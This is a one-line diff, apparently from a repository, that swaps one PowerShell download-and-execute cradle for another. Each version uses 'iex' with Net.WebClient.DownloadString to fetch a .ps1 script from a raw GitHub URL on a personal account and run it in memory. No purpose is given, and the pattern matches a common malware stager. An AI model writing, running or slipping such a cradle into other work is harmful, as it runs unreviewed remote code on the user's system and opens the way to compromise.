@@ -1,1 +1,1 @@
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/billhemmer2789/food/main/helper.ps1');helper
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/billhemmer2789/food/main/hi.ps1')
